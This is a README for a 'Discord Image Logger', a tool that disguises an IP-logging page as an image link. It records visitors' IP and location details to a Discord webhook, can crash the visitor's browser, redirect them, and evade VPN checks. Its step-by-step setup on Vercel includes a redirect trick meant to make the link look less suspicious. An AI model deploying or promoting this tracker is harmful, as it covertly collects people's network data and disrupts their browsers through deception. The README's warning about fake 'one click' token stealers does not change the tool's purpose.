# üì∏ Discord Image Logger
**Discord Image Logger** is a simple yet feature rich tool I have created which lets you easily make people click links. You can get a person to visit pretty much any site using this trick, and all that is needed is to send an image! It also includes an integrated IP logger with detailed info of the user.

Please note that this is **NOT** a "one click" image logger. A scam with a large population has been going around in which people claim they can make an image that will steal all your tokens, passwords, and more (Basically an image RCE) just by clicking an image. However, they are all **fake**, and I advise against running any EXE's you find from those repositories.

# üîß Configuration

Before setting it up, let's modify the **config.**

**WEBHOOK:** `Your Discord webhook!` <br>
**IMAGE:** `A LINK to your desired Image.` <br>
**USERNAME:** `The username of the bot that sends` <br>
**COLOR:** `The embed's sidebar color` <br>
**DOCRASHBROWSER:** `Crash the user's browser` <br>
**CUSTOMMESSAGE:** `Optional, Leave blank if none. User will see it as their browser dies.` <br>
**VPNCHECK:** `Prevent VPNs from spamming your webhook!` <br>
**LINKALERTS:** `Tell you when someone sends an image logging link` <br>
**BUGGEDIMAGE:** `Display a loading image on Discord` <br>
**ANTIBOT:** `Prevent bots from spamming your webhook!` <br>
**REDIRECT:** `Redirect user?` <br>
**PAGE:** `Page to redirect to, if so` <br>

# ‚öíÔ∏è Setup

Now that you've got all that set up, let's install this thing! <br>

- **1:** Create a GitHub repository. I recommend it be private, so others can't see your webhook URL.
- **2:** Make a folder named `api`, and place `requirements.txt` and `main.py` in (Rename it whatever, e.g. catpicture.py would make the URL your.site/api/catepicture)
- **3:** (Optional) make a file in the main root (NOT IN API) named `index.html`, and put the code below in:
```
<meta http-equiv="refresh" content="0;url=./api/main.py">
```
(You can replace main.py with whatever you made it!); The point of this step is so that you can just visit your.site and not your.site/api/main (The former seems much less suspicious)
- **4:** Visit https://vercel.com and log in with GitHub.
- **5:** Click *add new* to make a new project. Select the GitHub repository you made where it says **Import GitHub Repository**
- **6:** Copy the link it creates for you. Now you're good to go, start logging some IPs!

Additionally, you can add a domain if you own one!
